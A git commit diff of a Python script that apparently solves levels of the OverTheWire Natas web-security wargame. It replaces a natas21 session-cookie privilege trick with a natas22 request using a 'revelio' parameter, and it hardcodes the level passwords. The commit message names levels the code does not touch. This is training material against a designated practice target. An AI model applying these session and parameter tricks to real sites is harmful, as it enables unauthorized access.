63b3db76e1ae0303073606b70fa0f3a23c8b1f59
doctormartin67 <celticfans@hotmail.com>
2022-12-03 12:42:48 +0100

    natas23 and natas24

--- natas/main.py
+++ natas/main.py
@@ -1,19 +1,16 @@
 import sys
 import requests as req
 
-username = "natas21"
-password = "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56"
-url = "http://%s-experimenter.natas.labs.overthewire.org/" % username
-url_orig = "http://%s.natas.labs.overthewire.org/" % username
+username = "natas22"
+password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"
+url = "http://%s.natas.labs.overthewire.org/" % username
 
-data = {"admin": "1", "submit": "Update", "debug": ""}
+data = {"revelio": ""}
 s = req.session()
 
+r = s.get(url, auth=(username, password))
 r = s.get(url, auth=(username, password), params=data)
 print(r.text)
 print(r.cookies)
-
-r = s.get(url_orig, auth=(username, password), cookies={"PHPSESSID":
-r.cookies["PHPSESSID"]})
-print(r.text)
-print(r.cookies)
+print(r.headers)
+print(s.proxies)
